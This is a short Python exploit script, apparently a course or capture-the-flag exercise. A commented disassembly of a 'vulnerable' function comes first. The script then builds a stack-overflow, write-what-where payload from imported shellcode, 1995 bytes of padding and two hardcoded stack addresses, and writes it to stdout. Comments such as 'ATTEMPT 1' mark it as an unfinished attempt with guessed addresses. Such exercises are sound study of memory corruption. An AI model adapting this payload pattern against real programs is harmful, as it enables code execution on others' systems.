# Dump of assembler code for function vulnerable:
#    0x08048bf5 <+0>:     push   ebp
#    0x08048bf6 <+1>:     mov    ebp,esp
#    0x08048bf8 <+3>:     push   ebx
#    0x08048bf9 <+4>:     sub    esp,0x814
#    0x08048bff <+10>:    call   0x8048c8d <__x86.get_pc_thunk.ax>
#    0x08048c04 <+15>:    add    eax,0x953fc
#    0x08048c09 <+20>:    sub    esp,0x4
#    0x08048c0c <+23>:    push   0x808
#    0x08048c11 <+28>:    push   DWORD PTR [ebp+0x8]
#    0x08048c14 <+31>:    lea    edx,[ebp-0x810]
#    0x08048c1a <+37>:    push   edx
#    0x08048c1b <+38>:    mov    ebx,eax
#    0x08048c1d <+40>:    call   0x8048210
#    0x08048c22 <+45>:    add    esp,0x10
#    0x08048c25 <+48>:    mov    eax,DWORD PTR [ebp-0xc]
#    0x08048c28 <+51>:    mov    edx,DWORD PTR [ebp-0x10]
#    0x08048c2b <+54>:    mov    DWORD PTR [eax],edx
#    0x08048c2d <+56>:    nop

from shellcode import shellcode
import sys

# ATTEMPT 1
#0xfff6cc68
padding = b'A' * 1995
a_address = 0xfff6cbdc  # Replace maybeeeeee

shells = 0xfff6a0bc

exploit = shellcode + padding + a_address.to_bytes(4, 'little') + shells.to_bytes(4, 'little')
sys.stdout.buffer.write(exploit)
